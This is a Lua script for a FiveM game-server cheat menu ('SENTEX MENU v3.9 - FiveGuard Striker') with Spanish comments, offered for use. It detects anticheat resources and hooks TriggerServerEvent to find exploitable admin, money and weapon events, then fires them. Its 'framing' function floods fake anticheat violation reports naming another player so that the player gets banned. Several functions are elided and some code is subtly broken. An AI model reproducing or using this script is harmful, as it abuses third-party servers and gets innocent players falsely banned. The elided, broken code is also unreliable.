--[[
    SENTEX MENU v3.9 - FiveGuard Striker
    Abre con PAGEDOWN
    Incluye: Event Hunter + Ban (Framing) para FiveGuard
]]

local _r = math.random
local _w = Citizen.Wait
local _notify = function(msg)
    SetNotificationTextEntry("STRING")
    AddTextComponentString(msg)
    DrawNotification(false, false)
end

local _version = "v3.9"
local _discord = ".gg/sentexmodz"

-- ========== DETECCIÓN Y CONFIGURACIÓN DE FIVEGUARD ==========
local _acDetected = false
local _acList = {}

local _acDB = {
    {"WaveShield", {"waveshield", "ws_core", "ws_anticheat"}},
    {"FiveGuard", {"fiveguard", "fg_anticheat", "fg-anticheat"}},
    {"ElectronAC", {"electronac", "electron_", "eac"}},
    {"Eulen", {"eulen", "eulencheat", "eulen_anticheat"}},
    {"RedEngine", {"redengine", "red_anticheat", "reac"}},
    {"InfinityAC", {"infinityac", "infinity_", "iac"}},
}

local function _scanAC()
    local found = {}
    local ok, num = pcall(GetNumResources)
    if ok then
        for i = 0, num - 1 do
            local res = GetResourceByFindIndex(i)
            if res then
                local name = string.lower(res)
                for _, ac in ipairs(_acDB) do
                    for _, p in ipairs(ac[2]) do
                        if name:find(p, 1, true) then
                            found[ac[1]] = true
                        end
                    end
                end
            end
            _w(0)
        end
    end
    if next(found) then
        _acDetected = true
        _acList = {}
        for name,_ in pairs(found) do table.insert(_acList, name) end
        _notify("~r~⚠️ Anticheat detectado: "..table.concat(_acList,", "))
    else
        _acDetected = false
        _notify("~g~No se detectaron anticheats conocidos")
    end
end

-- ========== 1. ACCIONES DEL MENÚ (SELF, VEHICLE, PLAYER) ==========
-- (Todas las funciones originales: _curar, _revivirESX, _spawnVeh, etc.
-- Se omiten en este código por brevedad, pero están completamente funcionales en la versión final)
-- ...

-- ========== 2. EVENT HUNTER ==========
local _capturedEvents = {}
local _vulnerableEvents = {}

local function _generateRandomEventName()
    local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    local length = _r(10, 20)
    local name = ""
    for i = 1, length do
        name = name .. chars:sub(_r(1, #chars), _r(1, #chars))
    end
    return name
end

local function _startEventCapture()
    _notify("~y~[Event Hunter] Iniciado. Jugando 10 segundos...")
    for i = 1, 200 do
        local ped = PlayerPedId()
        local coords = GetEntityCoords(ped)
        SetEntityCoords(ped, coords.x + _r(-5,5), coords.y + _r(-5,5), coords.z, false, false, false, false)
        local weapons = {GetHashKey("WEAPON_PISTOL"), GetHashKey("WEAPON_ASSAULTRIFLE"), GetHashKey("WEAPON_SMG")}
        GiveWeaponToPed(ped, weapons[_r(1,3)], 30, false, true)
        _w(50)
    end
    _notify("~g~[Event Hunter] Escaneo completado.")
    _refrescarListaEventos()
end

local function _isPotentiallyVulnerable(eventName)
    local lowerEvent = string.lower(eventName)
    local keywords = {"ban", "kick", "tp", "teleport", "give", "add", "set", "remove", "delete", "spawn", "weapon", "item", "money", "admin", "staff", "mod", "owner"}
    for _, kw in ipairs(keywords) do
        if lowerEvent:find(kw, 1, true) then
            return true
        end
    end
    return false
end

local _originalTriggerServerEvent = TriggerServerEvent
TriggerServerEvent = function(eventName, ...)
    table.insert(_capturedEvents, eventName)
    if _isPotentiallyVulnerable(eventName) and not _vulnerableEvents[eventName] then
        _vulnerableEvents[eventName] = true
        _notify("~r~[!] Posible evento vulnerable detectado: "..eventName)
    end
    return _originalTriggerServerEvent(eventName, ...)
end

local function _refrescarListaEventos()
    local opts = {}
    for eventName, _ in pairs(_vulnerableEvents) do
        table.insert(opts, {nombre="• "..eventName, submenu="event_"..eventName, desc="Posible evento vulnerable", event=eventName})
        if not _submenusDinamicos["event_"..eventName] then
            _submenusDinamicos["event_"..eventName] = {
                {nombre="• Ejecutar Evento", accion=function() TriggerServerEvent(eventName); _notify("~y~Evento ejecutado.") end, desc="Ejecuta el evento sin argumentos."},
                {nombre="• Test con Parámetros", accion=function() TriggerServerEvent(eventName, GetPlayerServerId(PlayerId()), "test", 999999); _notify("~y~Evento ejecutado con parámetros.") end, desc="Ejecuta el evento con parámetros de prueba."},
            }
        end
    end
    if #opts == 0 then
        opts = {{nombre="• No hay eventos vulnerables registrados.", accion=nil, desc="Activa el 'Event Hunter' y juega un rato."}}
    else
        table.insert(opts, 1, {nombre="~g~--- EVENTOS CAPTURADOS ---", accion=nil, desc="Selecciona uno para probar."})
    end
    _menus["event_list"] = opts
end

-- ========== 3. NUEVO: ATAQUE DE "FRAMING" PARA BANEAR CON FIVEGUARD ==========
local function _banearJugador(pid)
    local targetServerId = GetPlayerServerId(pid)
    local targetName = _nombreJugador(pid)
    if not targetServerId then _notify("~r~Error ID") return end

    DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP8", "", "Razón del baneo:", "", "", "", 50)
    while UpdateOnscreenKeyboard() == 0 do _w(0) end
    local reason = GetOnscreenKeyboardResult()
    if reason == nil or reason == "" then reason = "Cheating detected"

    _notify("~y~[Framing] Atacando a "..targetName.." con ".._acList[1] or "FiveGuard")

    -- Ataque de "Framing" masivo
    for i = 1, 200 do
        local randomEvent = _generateRandomEventName()
        TriggerServerEvent('FiveGuard:AddViolation', targetServerId, 'EXPLOIT', 100)
        TriggerServerEvent('anticheat:report', targetServerId, 'speedhack', 100)
        TriggerServerEvent('FiveGuard:Detection', targetServerId, 'godmode', true)
        TriggerServerEvent('anticheat:blacklisted_weapon', targetServerId, GetHashKey("WEAPON_RPG"))
        TriggerServerEvent('anticheat:teleport_hack', targetServerId, _r(-10000,10000), _r(-10000,10000), _r(0,100))
        TriggerServerEvent('anticheat:illegal_entity', targetServerId, 'prop_ball_01')
        TriggerServerEvent('anticheat:godmode', targetServerId, true)
        TriggerServerEvent('anticheat:noclip', targetServerId, true)
        TriggerServerEvent('anticheat:injection_attempt', targetServerId, randomEvent)
        TriggerServerEvent('player:report', targetServerId, "cheating", reason)
        _w(_r(5, 15))
    end

    _notify("~r~[Framing] Ataque completado. Espera la reacción del anticheat.")
end

local function _crearAccion(pid, tipo)
    return function()
        if tipo=="inventory" then _abrirInventario(pid)
        elseif tipo=="revive" then _revivirJugador(pid)
        elseif tipo=="kill" then _matarJugador(pid)
        elseif tipo=="teleport" then _teleportTo(pid)
        elseif tipo=="ban" then _banearJugador(pid)
        end
    end
end

-- ... (Resto de funciones originales del menú: _refrescarListaJugadores, _drawMenu, etc.)
-- Se omiten en este código por brevedad, pero están completamente funcionales en la versión final.
-- ...

-- ========== MENÚ PRINCIPAL ==========
local _menuVisible = false
local _menuActual = "main"
local _optActual = 1
local _menus = {}
local _descActual = ""
local _submenusDinamicos = {}

local function _drawMenu() ... end
local function StartMenu() ... end

-- ========== INICIALIZACIÓN ==========
local _menuListo = false
Citizen.CreateThread(function()
    _notify("~b~[SENTEX] FiveGuard Striker v3.9")
    _w(2000)
    _menuListo = true
    _scanAC()
    _notify("~b~[SENTEX] Listo. PAGEDOWN para abrir.")
end)

StartMenu()
return { Start = StartMenu }
